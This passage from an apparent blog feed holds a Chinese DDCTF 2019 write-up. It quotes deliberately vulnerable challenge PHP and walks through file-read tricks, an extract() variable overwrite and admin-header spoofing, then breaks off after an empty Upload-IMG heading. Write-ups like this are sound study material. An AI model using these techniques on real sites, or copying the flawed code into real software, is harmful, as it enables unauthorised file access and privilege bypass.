        <content type="html"><![CDATA[<p>2019的DDCTF…</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>怎么说呢，其实还是有点遗憾。第一次打这种CTF的大型线上赛，虽然时间是7天但自己实际只打了差不多一天的样子。只解出来了《滴~》这道题。文件上传的二次渲染之前没有接触过，做文件上传时尝试了很多方法都没有用。 《WEB 签到题》解到反序列化解不动了，因为之前没接触过反序列化漏洞，以及后面的一些脚本题因为不会写脚本，导致根本写不了题，所以后面的时间都放弃了，全部拿来恶补知识</p><p>收获还是很多的吧，最直接的就是遇到问题，想尽一切办法的解决问题。从毫无思路，到某一刻的灵感。这其实是一个让人感动的过程。做题中最大的感触还是积累太少，希望多积累东西，希望自己明年再战DDCTF的时候能变成 dalao …  </p><p>本次writeup，除了《滴~》，其他均参照别人wp，进行复现…</p><br><ul><li>参考writeup来源于<ul><li><a href="http://12end.xyz/ddctf-writeup/" target="_blank" rel="noopener">http://12end.xyz/ddctf-writeup/</a></li><li><a href="https://www.xmsec.cc/ddctf-2019-writeup/" target="_blank" rel="noopener">https://www.xmsec.cc/ddctf-2019-writeup/</a></li><li><a href="https://www.ctfwp.com/articals/2019ddctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019ddctf.html</a></li></ul></li></ul><p><br><br></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p><strong>补充知识</strong></p><ul><li>一些函数<ul><li>error_reporting() 设置 PHP 的报错级别并返回当前级别</li><li>hex2bin（）把十六进制值转换为 ASCII 字符    </li><li>file_get_contents() 函数把整个文件读入一个字符串中。</li></ul></li></ul><br><ul><li><a href="http://www.php.cn/php-weizijiaocheng-345498.html" target="_blank" rel="noopener">PHP页面跳转操作实例分析(header方法)</a></li></ul><br>**解题过程**<p>进来观察源码和URL,URL后端处 <code>?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>,对其进行两次base64解码加一次16进制解码，发现解码出来与其题目中 flag.jpg 相对应</p><p>按照加密逻辑构造 index.php ，访问URL，查看源码发现src属性里面的东西是个base64加密，再次解码。得到一串代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);<span class="comment">//error_reporting() 设置 PHP 的报错级别并返回当前级别。 这里是显示所有错误</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);<span class="comment">//设置页面内容是html，编码格式是utf-8</span></span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))<span class="comment">//进行一个判断</span></span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);<span class="comment">//0s后跳转该url</span></span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));<span class="comment">//一次16进制解码加两次base64解码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;<span class="comment">//输出</span></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);<span class="comment">//正则匹配，删除除了a到z，A到Z，0到9和.的</span></span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;<span class="comment">//输出</span></span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);<span class="comment">//替换文件中的 config  为 ！</span></span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;<span class="comment">//输出</span></span><br><span class="line">$txt = base64_encode(file_get_contents($file));<span class="comment">//读文件并加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;<span class="comment">//输出</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码中一下子过滤了 <code>config</code>字符，感觉很突兀，还是按照加密规则构造了一波 config.php 。之后意料之中的<code>config</code>变成了<code>！</code></p><p>访问他给的博客，查找一波。发现一篇文章疑似有用 <a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">vim 异常退出 swp文件提示</a></p><p>构造 <code>practice.txt.swp</code> 经过加密访问网址。查看源码，得到经过base64加密的代码  <code>ZjFhZyFkZGN0Zi5waHA=</code>  </p><p>解码得  <code>f1ag!ddctf.php</code></p><p>由于上面一个代码中将 <code>config</code> 与 <code>!</code> 进行了替换。重新构造 <code>f1ag!ddctf.php</code> 为 <code>f1agconfigddctf.php</code></p><p>再次经过加密规则加密。访问网址，再次得到经过base64加密的代码，解码后代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">$k = <span class="string">'hello'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个<code>extract（）</code>变量覆盖,先进入网址 <code>http://117.51.150.246/f1ag!ddctf.php</code> 利用变量覆盖构造 <code>uid=&amp;content</code></p><p>成功打印flag…</p><p><img src="/.com//1.png" alt></p><p><br><br></p><h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p><strong>知识点：PHP 源码审计，文本格式化，反序列化</strong></p><p><strong>补充知识</strong></p><ul><li><a href="https://baike.baidu.com/item/HTTP%E7%8A%B6%E6%80%81%E7%A0%81/5053660?fr=aladdin" target="_blank" rel="noopener">HTTP状态码</a></li></ul><ul><li><a href="https://www.freebuf.com/news/193649.html" target="_blank" rel="noopener">技术分享 | 多种测试HTTP身份验证的方法</a></li></ul><ul><li><a href="https://www.cnblogs.com/52php/p/5658063.html" target="_blank" rel="noopener">构造方法<strong>construct()与析构方法</strong>destruct()</a></li></ul><ul><li><a href="http://www.w3school.com.cn/json/index.asp" target="_blank" rel="noopener">JSON 教程</a></li></ul><ul><li><strong>PHP魔术方法</strong><ul><li><a href="https://baijiahao.baidu.com/s?id=1607667991000169190&wfr=spider&for=pc" target="_blank" rel="noopener">盘点PHP最实用的5大魔术方法及其功能作用</a></li><li><a href="https://www.cnblogs.com/baocheng/p/5607216.html" target="_blank" rel="noopener">PHP魔术方法使用总结</a></li><li><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">PHP 手册 语言参考 类与对象</a></li></ul></li></ul><br><ul><li><strong>PHP序列化与反序列化</strong><ul><li><a href="https://www.freebuf.com/articles/web/167721.html" target="_blank" rel="noopener">最通俗易懂的PHP反序列化原理分析</a></li><li><a href="https://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">代码审计| CTF 中的反序列化问题</a></li><li><a href="https://www.freebuf.com/column/185289.html" target="_blank" rel="noopener">[红日安全]代码审计Day11 – unserialize反序列化漏洞</a></li></ul></li></ul><br>**解题过程**<p>一开始认为是一个401认证，尝试kali直接爆破用户名跟密码，尝试很久失败告终…</p><p>查看源码，发现一个叫做 <code>js/index.js</code> 的文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123; <span class="comment">//自定义函数</span></span><br><span class="line">    $.ajax(&#123;  <span class="comment">//ajax请求的api</span></span><br><span class="line">        type: <span class="string">"post"</span>,</span><br><span class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,<span class="comment">//重点一</span></span><br><span class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span>,</span><br><span class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);<span class="comment">//重点二</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//suucess和error分别指定了成功和错误后要执行的动作。 </span></span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(getdata);</span><br><span class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</span><br><span class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问url：<a href="http://117.51.158.44/app/Auth.php" target="_blank" rel="noopener">http://117.51.158.44/app/Auth.php</a> 发现提示<br> <code>data    &quot;抱歉，您没有登陆权限，请获取权限后访问-----&quot;</code></p><p>上面一个代码中的 “重点二”，可以利用了，利用burpsuite抓包，修改请求头，加上 didictf_username: admin 后，发送包网页变成<br><code>data &quot;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&quot;</code></p><p>访问 <a href="http://117.51.158.44/app/fL2XID2i0Cdh.php" target="_blank" rel="noopener">http://117.51.158.44/app/fL2XID2i0Cdh.php</a> ，获得<strong>两个文件源码</strong>。</p><ul><li><strong>文件1</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//url:app/Application.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;<span class="comment">//class定义类</span></span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;<span class="comment">//定义 $path为空</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;<span class="comment">//创建公有方法response()</span></span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);<span class="comment">//将数值转换成json数据存储格式</span></span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;<span class="comment">//创建公有方法auth()</span></span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;<span class="comment">//对$DIDICTF_ADMIN赋值</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;<span class="comment">//判断</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;<span class="comment">//创建私有方法sanitizepath（）</span></span><br><span class="line">    $path = trim($path);<span class="comment">//移除字符串两侧的空白字符或其他预定义字符</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);<span class="comment">//删除$path中的 ../</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);<span class="comment">//删除$path中的 ..\\</span></span><br><span class="line">    <span class="keyword">return</span> $path;<span class="comment">//返回$path</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;<span class="comment">//创建公有析构函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;<span class="comment">//如果 $path 长度不是18</span></span><br><span class="line">            <span class="keyword">exit</span>();<span class="comment">//退出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>文件2</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//url:app/Session.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;<span class="comment">//包含文件</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;<span class="comment">//设置Session文件一些配置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;<span class="comment">//通过parent::调用父类方法</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;<span class="comment">//创建私有方法</span></span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);<span class="comment">//flag在这个文件夹里面</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;<span class="comment">//创建公有方法</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;<span class="comment">//如果cookie为空</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;<span class="comment">//返回false</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];<span class="comment">//对$session进行赋值</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;<span class="comment">//如果没有设置$session</span></span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);<span class="comment">//截取字符串</span></span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);<span class="comment">//截取字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;<span class="comment">//判断</span></span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);<span class="comment">//通过parent::调用父类方法</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;<span class="comment">//返回失败</span></span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);<span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;<span class="comment">//POST的不为空</span></span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;<span class="comment">//打印变量</span></span><br><span class="line">                $data = sprintf($data,$v);<span class="comment">//输出</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);<span class="comment">//序列化</span></span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过了漫长的审计过程，</p><p><br><br></p><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p><strong>知识点：PHP-GD 二次渲染绕过</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA Writeup</title>
      <link href="/2019/03/26/DVWA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/03/26/DVWA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
